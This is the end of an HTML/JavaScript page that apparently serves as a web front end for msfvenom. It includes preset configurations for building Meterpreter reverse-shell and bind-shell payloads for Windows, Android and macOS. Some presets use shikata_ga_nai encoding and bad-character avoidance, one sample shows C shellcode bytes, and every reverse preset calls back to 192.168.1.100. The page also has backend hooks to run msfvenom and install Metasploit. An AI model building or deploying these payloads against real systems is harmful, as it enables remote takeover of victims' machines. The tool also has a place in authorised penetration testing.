                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 400 bytes\nFinal size of exe file: 75000 bytes\n"
                    },
                    {
                        "name": "Windows Meterpreter Reverse HTTP (EXE)",
                        "description": "Generates a Windows Meterpreter reverse HTTP payload. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_http",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "8080",
                            "format_entry": "exe",
                            "output_file_entry": "http_shell.exe"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 500 bytes\nFinal size of exe file: 74000 bytes\n"
                    },
                    {
                        "name": "Windows Meterpreter Reverse HTTPS (EXE)",
                        "description": "Generates a Windows Meterpreter reverse HTTPS payload. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_https",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "443",
                            "format_entry": "exe",
                            "output_file_entry": "https_shell.exe"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 600 bytes\nFinal size of exe file: 74500 bytes\n"
                    },
                    {
                        "name": "Windows Shell Bind TCP (EXE)",
                        "description": "Generates a Windows shell bind TCP payload. Requires RPORT.",
                        "options": {
                            "payload_entry": "windows/shell/bind_tcp",
                            "rport_entry": "4444",
                            "format_entry": "exe",
                            "output_file_entry": "bind_shell.exe"
                        },
                        "example_output": "No RPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 200 bytes\nFinal size of exe file: 73000 bytes\n"
                    },
                    {
                        "name": "Windows Meterpreter Reverse TCP (Shikata Ga Nai Encoded)",
                        "description": "Generates an encoded Windows Meterpreter reverse TCP payload using shikata_ga_nai encoder with 5 iterations. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "encoder_entry": "x86/shikata_ga_nai",
                            "iterations_entry": "5",
                            "format_entry": "exe",
                            "output_file_entry": "encoded_shell.exe"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 341 (iteration 1)\nx86/shikata_ga_nai succeeded with size 360 (iteration 2)\nx86/shikata_ga_nai succeeded with size 380 (iteration 3)\nx86/shikata_ga_nai succeeded with size 400 (iteration 4)\nx86/shikata_ga_nai succeeded with size 420 (iteration 5)\nPayload size: 420 bytes\nFinal size of exe file: 74000 bytes\n"
                    },
                    {
                        "name": "Windows Meterpreter Reverse TCP (Bad Characters)",
                        "description": "Generates a Windows Meterpreter reverse TCP payload avoiding specified bad characters (e.g., null byte and newline). Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "bad_chars_entry": "\\x00\\x0a\\x0d",
                            "format_entry": "exe",
                            "output_file_entry": "no_badchars_shell.exe"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 341 (iteration 1)\nPayload size: 341 bytes\nFinal size of exe file: 73802 bytes\n"
                    },
                    {
                        "name": "Windows Meterpreter Reverse TCP (RAW)",
                        "description": "Generates raw shellcode for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "raw",
                            "output_file_entry": "shellcode.bin"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (C)",
                            "description": "Generates C-style shellcode for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "c",
                                "output_file_entry": "shellcode.c"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nunsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n..."
                        },
                        {
                            "name": "List Payloads",
                            "description": "Lists all available payloads in msfvenom.",
                            "options": {
                                "list_payloads_var": true
                            },
                            "example_output": "Available payloads:\n-------------------\n\nwindows/meterpreter/reverse_tcp\nwindows/shell/reverse_tcp\nlinux/x86/meterpreter/reverse_tcp\n...\n"
                        },
                        {
                            "name": "List Encoders",
                            "description": "Lists all available encoders in msfvenom.",
                            "options": {
                                "list_encoders_var": true
                            },
                            "example_output": "Available encoders:\n-------------------\n\nx86/shikata_ga_nai\nx86/alpha_mixed\nx86/alpha_upper\n...\n"
                        },
                        {
                            "name": "List Formats",
                            "description": "Lists all available output formats in msfvenom.",
                            "options": {
                                "list_formats_var": true
                            },
                            "example_output": "Available formats:\n------------------\n\nraw\nexe\nelf\n...\n"
                        },
                        {
                            "name": "List Architectures",
                            "description": "Lists all available architectures in msfvenom.",
                            "options": {
                                "list_architectures_var": true
                            },
                            "example_output": "Available architectures:\n------------------------\n\nx86\nx64\narmle\n...\n"
                        },
                        {
                            "name": "List Platforms",
                            "description": "Lists all available platforms in msfvenom.",
                            "options": {
                                "list_platforms_var": true
                            },
                            "example_output": "Available platforms:\n--------------------\n\nwindows\nlinux\nosx\n...\n"
                        },
                        {
                            "name": "Android Meterpreter Reverse TCP (APK)",
                            "description": "Generates an Android Meterpreter reverse TCP payload in an APK format. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "android/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "apk",
                                "output_file_entry": "android_shell.apk"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Android from the payload\nNo arch selected, selecting arch: dalvik from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 10000 bytes\nFinal size of apk file: 2000000 bytes\n"
                        },
                        {
                            "name": "macOS Meterpreter Reverse TCP (Mach-O)",
                            "description": "Generates a macOS Meterpreter reverse TCP payload in a Mach-O executable format. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "osx/x64/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "macho",
                                "output_file_entry": "macos_shell"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::OSX from the payload\nNo arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 500 bytes\nFinal size of macho file: 80000 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (PowerShell)",
                            "description": "Generates a PowerShell script for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "psh",
                                "output_file_entry": "shell.ps1"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nfunction Invoke-Shellcode\n{\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$True)]\n        [Byte[]]$Shellcode\n    )\n...\n"
                        }
                ];
                filterExamples();
            }
        }


        function filterExamples() {
            const searchQuery = document.getElementById('example_search_entry').value.toLowerCase();
            const examplesList = document.getElementById('examples_list');
            examplesList.innerHTML = ''; // Clear current list

            allExamples.forEach(example => {
                if (example.name.toLowerCase().includes(searchQuery) || example.description.toLowerCase().includes(searchQuery)) {
                    const exampleDiv = document.createElement('div');
                    exampleDiv.className = 'bg-gray-800 p-4 rounded-lg shadow-md flex flex-col md:flex-row justify-between items-start md:items-center';
                    exampleDiv.innerHTML = `
                        <div>
                            <h3 class="text-lg font-semibold text-purple-300">${escapeHtml(example.name)}</h3>
                            <p class="text-sm text-gray-400 mb-2 md:mb-0">${escapeHtml(example.description)}</p>
                        </div>
                        <div class="flex mt-2 md:mt-0 space-x-2">
                            <button class="bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded-md text-sm" onclick="loadExampleOptions(${escapeHtml(JSON.stringify(example.options))})">Select</button>
                            <button class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded-md text-sm" onclick="showExampleOutputModal('${escapeHtml(example.name)} Output', ${escapeHtml(JSON.stringify(example.example_output))})">Output</button>
                        </div>
                    `;
                    examplesList.appendChild(exampleDiv);
                }
            });
            lucide.createIcons(); // Re-render Lucide icons for new elements
        }

        function clearExampleSearch() {
            document.getElementById('example_search_entry').value = '';
            filterExamples();
        }

        function loadExampleOptions(options) {
            clearAllInputs(); // Clear all inputs first

            // Populate form fields with example options
            for (const key in options) {
                const element = document.getElementById(key);
                if (element) {
                    if (element.type === 'checkbox') {
                        element.checked = options[key];
                    } else if (element.tagName === 'TEXTAREA') {
                        element.value = options[key];
                    } else {
                        element.value = options[key];
                    }
                }
            }
            generateCommand(); // Re-generate command after loading
            showMessageModal('Example Loaded', 'Example options have been loaded. Check other tabs and the generated command.');
            showTab('payload'); // Switch to payload tab
        }

        // Helper to escape HTML for safe display
        function escapeHtml(text) {
            if (typeof text !== 'string') {
                text = String(text);
            }
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
        }

        // Helper to unescape HTML entities
        function unescapeHtml(html) {
            const doc = new DOMParser().parseFromString(html, 'text/html');
            return doc.documentElement.textContent;
        }

        function clearAllInputs() {
            document.querySelectorAll('#tab-content-container input[type="text"], #tab-content-container input[type="number"], #tab-content-container textarea').forEach(element => {
                element.value = '';
            });
            document.querySelectorAll('#tab-content-container input[type="checkbox"]').forEach(element => {
                element.checked = false;
            });
            document.querySelectorAll('#tab-content-container select').forEach(element => {
                element.value = ''; // Clear dropdown selection
            });
            // No specific default values to reset for msfvenom like Nmap's timing template
            generateCommand();
        }

        // Function to handle msfvenom installation
        async function handleMsfvenomInstallation(platformType) {
            const linuxButton = document.getElementById('install_msfvenom_linux_button');
            const termuxButton = document.getElementById('install_msfvenom_termux_button');
            const windowsButton = document.getElementById('download_msfvenom_windows_button');

            // Disable all install buttons during an installation attempt
            linuxButton.disabled = true;
            termuxButton.disabled = true;
            windowsButton.disabled = true;

            showStatus('Checking system and preparing for installation...', 'blue');
            document.getElementById('output_text').innerHTML = ''; // Clear output area
            currentOutputBuffer = ""; // Clear output buffer for installation logs

            if (platformType === 'linux' || platformType === 'termux') {
                const osName = platformType === 'termux' ? "Termux" : "Linux (Kali/Ubuntu)";
                showInstallConfirmModal(
                    'Install Metasploit Framework',
                    `Your operating system is <strong>${osName}</strong>. Do you want to install Metasploit Framework (which includes msfvenom) now? This will require superuser privileges and might ask for your password in the server console. It will also run 'apt update && apt upgrade' or 'pkg update && pkg upgrade' first.`,
                    async () => {
                        // This function will be called if the user confirms
                        showStatus(`Installing Metasploit Framework on ${osName}...`, 'blue');
                        try {
                            const response = await fetch('/install_msfvenom', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ platform: platformType }) // Pass platform type to backend
                            });
                            const data = await response.json();

                            if (data.status === 'error') {
                                showStatus(`Metasploit Framework installation failed: ${data.message}`, 'red');
                                showMessageModal('Installation Failed', `Failed to install/update Metasploit Framework: ${data.message}<br><br>Output:<pre>${escapeHtml(data.output)}</pre>`, true);
                                insertColoredText(document.getElementById('output_text'), data.output);
                                // Re-enable buttons on error
                                linuxButton.disabled = false;
                                termuxButton.disabled = false;
                                windowsButton.disabled = false;
                            } else { // status is 'running' for real-time output
                                currentScanId = data.scan_id; // Use the scan_id returned by the backend
                                showStatus(`Metasploit Framework installation started (ID: ${currentScanId}). Fetching output...`, 'blue');
                                pollInterval = setInterval(pollOutput, 500); // Start polling for output
                            }
                        } catch (error) {
                            console.error('Error during Metasploit Framework installation fetch:', error);
                            showStatus('An error occurred during installation.', 'red');
                            showMessageModal('Installation Error', `An error occurred while trying to install Metasploit Framework: ${error.message}. Check server logs for more details.`);
                            // Re-enable buttons on error
                            linuxButton.disabled = false;
                            termuxButton.disabled = false;
                            windowsButton.disabled = false;
                        }
                    }
                );
            } else if (platformType === 'windows') {
                const downloadMessage = `Metasploit Framework (which includes msfvenom) cannot be installed directly via this web interface on Windows.
                <br><br>
                Please download the Metasploit Installer from the official Rapid7 website:
                <br><br>
                <a href="https://www.metasploit.com/download" target="_blank" class="text-purple-400 hover:underline">Download Metasploit Framework for Windows</a>
                <br><br>
                After installation, ensure that the Metasploit Framework bin directory (e.g., C:\\metasploit-framework\\bin) is added to your system's PATH environment variable.`;
                showMessageModal('Install Metasploit Framework', downloadMessage, true); // Use isHtml = true
                showStatus('Metasploit Framework installation is not directly supported on Windows via this interface.', 'orange');
                // Re-enable buttons immediately for Windows as no backend process is started
                linuxButton.disabled = false;
                termuxButton.disabled = false;
                windowsButton.disabled = false;
            } else {
                showMessageModal('Install Metasploit Framework', `Metasploit Framework installation is not automatically supported for your operating system (${navigator.platform}). Please install it manually.`);
                showStatus('Metasploit Framework installation is not supported for this system.', 'orange');
                // Re-enable buttons immediately for unsupported OS
                linuxButton.disabled = false;
                termuxButton.disabled = false;
                windowsButton.disabled = false;
            }
        }

        // Initial setup
        document.addEventListener('DOMContentLoaded', () => {
            generateCommand(); // Generate command on page load (will be "msfvenom" initially)
            loadExamples(); // Load examples for the Examples tab
            document.getElementById('run_msfvenom_button').addEventListener('click', runMsfvenom);
            
            // New event listeners for specific installation buttons
            document.getElementById('install_msfvenom_linux_button').addEventListener('click', () => handleMsfvenomInstallation('linux'));
            document.getElementById('install_msfvenom_termux_button').addEventListener('click', () => handleMsfvenomInstallation('termux'));
            document.getElementById('download_msfvenom_windows_button').addEventListener('click', () => handleMsfvenomInstallation('windows'));
        });
    </script>
</body>
</html>
